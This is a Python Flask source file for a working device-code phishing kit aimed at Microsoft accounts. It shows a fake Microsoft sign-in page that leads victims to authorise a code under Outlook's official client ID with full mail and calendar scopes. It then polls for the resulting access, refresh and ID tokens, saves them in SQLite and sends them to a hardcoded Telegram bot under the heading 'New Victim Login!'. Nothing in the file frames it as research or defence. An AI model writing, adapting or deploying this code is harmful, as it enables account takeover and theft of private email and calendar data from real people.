import os
import time
import sqlite3
import threading
import requests
from flask import Flask, request, jsonify, render_template_string, make_response

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Official Microsoft Outlook Client ID (First-party app, no verification warning)
CLIENT_ID = "d3590ed6-52e3-4102-a4db-a8f659f42c96"

# Endpoints
AUTH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

# Scope: Full Outlook access + Refresh Token + Profile info
SCOPE = "https://outlook.office.com/Mail.ReadWrite https://outlook.office.com/Calendars.ReadWrite offline_access openid profile email"

app = Flask(__name__)

# --- DATABASE SETUP (SQLite) ---
DB_NAME = 'sessions.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        status TEXT DEFAULT 'pending',
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        expires_in INTEGER,
        token_type TEXT,
        scope TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def save_session(sid, device_code, user_code, verification_uri):
    conn = get_db()
    try:
        conn.execute('INSERT OR REPLACE INTO sessions (sid, device_code, user_code, verification_uri, status) VALUES (?, ?, ?, ?, ?)',
                     (sid, device_code, user_code, verification_uri, 'pending'))
        conn.commit()
    finally:
        conn.close()

def update_session_tokens(sid, data):
    conn = get_db()
    try:
        conn.execute('''UPDATE sessions SET 
            status = 'completed',
            access_token = ?,
            refresh_token = ?,
            id_token = ?,
            expires_in = ?,
            token_type = ?,
            scope = ?
            WHERE sid = ?''',
            (data.get('access_token'),
             data.get('refresh_token'),
             data.get('id_token'),
             data.get('expires_in'),
             data.get('token_type'),
             data.get('scope'),
             sid))
        conn.commit()
    finally:
        conn.close()

def get_session_status(sid):
    conn = get_db()
    try:
        row = conn.execute('SELECT status, device_code FROM sessions WHERE sid = ?', (sid,)).fetchone()
        if row:
            return dict(row)
        return None
    finally:
        conn.close()

# --- TELEGRAM NOTIFICATIONS ---
def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        # Split message if too long for Telegram (4096 char limit)
        if len(text) > 4000:
            chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for chunk in chunks:
                requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": chunk, "parse_mode": "HTML"})
        else:
            requests.post(url, json=payload)
    except Exception as e:
        print(f"Telegram Error: {e}")

def notify_victim_login(sid, user_code, tokens):
    access_token = tokens.get('access_token', 'N/A')
    refresh_token = tokens.get('refresh_token', 'N/A')
    id_token = tokens.get('id_token', 'N/A')
    
    # Truncate tokens for display if needed, but send full ones in separate messages if critical
    msg = f"🎯 <b>New Victim Login!</b>\n\n"
    msg += f"<b>Session ID:</b> <code>{sid}</code>\n"
    msg += f"<b>User Code:</b> <code>{user_code}</code>\n\n"
    msg += f"<b>Access Token:</b>\n<code>{access_token[:50]}...</code>\n\n"
    msg += f"<b>Refresh Token:</b>\n<code>{refresh_token[:50]}...</code>\n\n"
    msg += f"<b>ID Token:</b>\n<code>{id_token[:50]}...</code>\n\n"
    msg += f"<i>Full tokens saved in DB.</i>"
    
    send_telegram_message(msg)

# --- POLLING THREAD ---
# We use a background thread to poll Microsoft for token completion
# This avoids blocking the web request and works even if the user closes the tab later
def poll_for_token(sid, device_code):
    while True:
        time.sleep(5) # Poll every 5 seconds
        
        # Check if session is already completed in DB (maybe by another thread or manual update)
        status_info = get_session_status(sid)
        if not status_info or status_info['status'] == 'completed':
            break
            
        try:
            resp = requests.post(TOKEN_URL, data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": CLIENT_ID,
                "device_code": device_code,
            })
            data = resp.json()
            
            if "access_token" in data:
                # Success! Save to DB and Notify
                update_session_tokens(sid, data)
                notify_victim_login(sid, status_info.get('user_code', 'Unknown'), data)
                break
            elif data.get("error") == "authorization_pending":
                continue # Keep waiting
            elif data.get("error") == "slow_down":
                time.sleep(5) # Back off
                continue
            else:
                # Other error (expired, declined, etc)
                print(f"Polling error for {sid}: {data}")
                break
        except Exception as e:
            print(f"Polling exception for {sid}: {e}")
            break

# --- ROUTES ---

@app.route('/')
def index():
    # Generate a unique session ID
    import uuid
    sid = str(uuid.uuid4()).replace('-', '')[:12]
    
    # Request Device Code from Microsoft
    try:
        resp = requests.post(AUTH_URL, data={
            "client_id": CLIENT_ID,
            "scope": SCOPE,
        })
        resp_data = resp.json()
        
        if "device_code" not in resp_data:
            return f"Error contacting Microsoft: {resp_data}", 500
            
        device_code = resp_data["device_code"]
        user_code = resp_data["user_code"]
        verification_uri = resp_data["verification_uri"]
        
        # Save to SQLite
        save_session(sid, device_code, user_code, verification_uri)
        
        # Start polling thread
        t = threading.Thread(target=poll_for_token, args=(sid, device_code))
        t.daemon = True
        t.start()
        
        # Render the phishing page
        html = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Sign in to your account</title>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .container {{ background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 2px; }}
                .logo {{ margin-bottom: 16px; }}
                .logo img {{ height: 24px; }}
                h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #1b1b1b; }}
                p {{ font-size: 15px; color: #1b1b1b; margin-bottom: 20px; line-height: 1.5; }}
                .code-box {{ background: #f0f0f0; padding: 15px; font-size: 24px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; border: 1px solid #ccc; border-radius: 4px; user-select: all; }}
                .btn {{ background-color: #0067b8; color: white; border: none; padding: 12px 24px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; border-radius: 4px; transition: background 0.2s; }}
                .btn:hover {{ background-color: #005da6; }}
                .footer {{ margin-top: 20px; font-size: 12px; color: #666; text-align: center; }}
                .hidden {{ display: none; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
                </div>
                <h1>Sign in</h1>
                <p>To sign in, use the device code shown below on the next screen.</p>
                
                <div class="code-box" id="codeDisplay">{user_code}</div>
                
                <button class="btn" id="copyBtn" onclick="handleCopy()">Copy Code & Continue</button>
                
                <div class="footer">
                    <p>Help protect your account by keeping your device secure.</p>
                </div>
            </div>

            <script>
                function handleCopy() {{
                    const code = document.getElementById('codeDisplay').innerText;
                    navigator.clipboard.writeText(code).then(() => {{
                        // Redirect to real Microsoft login after copying
                        window.location.href = "{verification_uri}";
                    }}).catch(err => {{
                        console.error('Failed to copy: ', err);
                        // Fallback redirect if copy fails
                        window.location.href = "{verification_uri}";
                    }});
                }}
            </script>
        </body>
        </html>
        """
        resp = make_response(html)
        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        resp.headers['Pragma'] = 'no-cache'
        resp.headers['Expires'] = '0'
        return resp
        
    except Exception as e:
        return f"Server Error: {str(e)}", 500

@app.route('/status')
def status():
    sid = request.args.get('sid')
    if not sid:
        return jsonify({"error": "No session ID"}), 400
    
    session = get_session_status(sid)
    if not session:
        return jsonify({"status": "not_found"}), 404
        
    return jsonify({"status": session['status']})

@app.route('/debug')
def debug():
    conn = get_db()
    try:
        rows = conn.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 10').fetchall()
        output = "<html><body><h1>Debug Sessions</h1><table border='1'><tr><th>SID</th><th>Status</th><th>User Code</th><th>Created</th></tr>"
        for row in rows:
            output += f"<tr><td>{row['sid']}</td><td>{row['status']}</td><td>{row['user_code']}</td><td>{row['created_at']}</td></tr>"
        output += "</table></body></html>"
        return output
    finally:
        conn.close()

@app.route('/test-telegram')
def test_telegram():
    send_telegram_message("✅ Telegram integration is working correctly!")
    return "Check your Telegram!"

if __name__ == '__main__':
    init_db()
    # For local testing only. On Render, use Gunicorn.
    app.run(host='0.0.0.0', port=10000, debug=False)
